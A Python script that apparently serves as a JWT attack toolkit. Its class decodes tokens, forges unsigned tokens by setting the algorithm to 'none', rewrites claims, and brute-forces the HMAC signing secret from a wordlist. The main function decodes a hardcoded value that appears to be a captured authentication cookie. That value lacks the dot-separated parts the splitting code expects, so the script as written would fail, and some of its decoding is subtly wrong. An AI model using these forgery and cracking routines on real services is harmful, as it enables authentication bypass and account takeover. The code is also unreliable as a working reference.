import base64
import json 
import hmac
import hashlib


class JWT:
    def __init__(self, jwt=None):
        self.jwt = jwt
        self.head = ''
        self.body = ''
        self.sig = ''
        self.enc_head = ''
        self.enc_body = ''
        self.decode_jwt(jwt)

    def decode_part(self, enc_part):
        self.dec_part = enc_part
        self.dec_part = base64.b64decode((self.dec_part + '==').encode()).decode()
        return json.loads(self.dec_part)


    def decode_jwt(self, jwt):
        #self.jwt = jwt
        self.head, self.body, self.sig = self.jwt.split('.')
        self.head = self.decode_part(self.head) 
        self.body = self.decode_part(self.body)
        return self.head, self.body, self.sig

    def encode_part(self, dec_part):
        self.dec_part = dec_part
        self.enc_part = base64.urlsafe_b64encode(json.dumps(self.dec_part, separators=(',', ':')).encode()).decode()
        self.enc_part = self.enc_part.rstrip('=')
        return self.enc_part

    def encode_jwt(self):
        #self.head , self.body, self.sig = head, body, sig
        self.enc_head = self.encode_part(self.head)
        self.enc_body = self.encode_part(self.body)
        return f"{self.enc_head}.{self.enc_body}.{self.sig}"
    
    def unsigned_JWT(self, jwt):
         #self.head, self.body , self.sig = self.decode_jwt(jwt)
         self.head['alg'] = 'none'
         self.head = self.encode_part(self.head)
         self.body = self.encode_part(self.body)
         return f"{self.head}.{self.body}."
    
    def modify_sub(self, body_key, body_value):
         #self.head, self.body , self.sig = self.decode_jwt(jwt)
         self.body[body_key] = body_value
         return self.encode_jwt()
    
    def bruteforce_sig(self, wordlist):
         with open(wordlist, 'r') as f:
              words = f.read().splitlines()
              for word in words:
                   new_sig = self.sign(word)
                   if new_sig == self.sig:
                        return word
     
    
    def sign(self, secret):
         enc_head = self.encode_part(self.head)
         enc_body = self.encode_part(self.body)
         parts = f"{enc_head}.{enc_body}".encode()
         sig_enc = hmac.new(secret.encode(), parts, hashlib.sha256).digest()
         sig_enc = base64.urlsafe_b64encode(sig_enc).decode()
         return sig_enc.rstrip('=')
    

def main():
  
        given_JWT = 'eyJmdW5uZWxzIjp7InRzIjoxNzM0NjAwMzA5LCJ0dGwiOjg2NDAwLCJmdW5uZWxzIjp7IjIwMTkwMTE2X2hvbWVwYWdlIjp7ImNob2ljZSI6ImNvbnRyb2wifSwiMjAyMTA5MDNfbm9fZW1haWxfc2lnbnVwIjp7ImNob2ljZSI6ImV4cGVyaW1lbnQifSwiMjAyMzAyMDZfbGVzc19icmFuZGluZyI6eyJjaG9pY2UiOiJjb250cm9sIn19fSwiX2F1dGhlbnRpY2F0aW9uX3Rva2VuIjoiNjM5ODk2MTMyMTgyMzkyMjM4ODY2OTkyODQ5ODExOTAifQ=='
        jwt = JWT(given_JWT)
        print(jwt.decode_jwt(given_JWT))
        



if __name__ == "__main__":
    main()
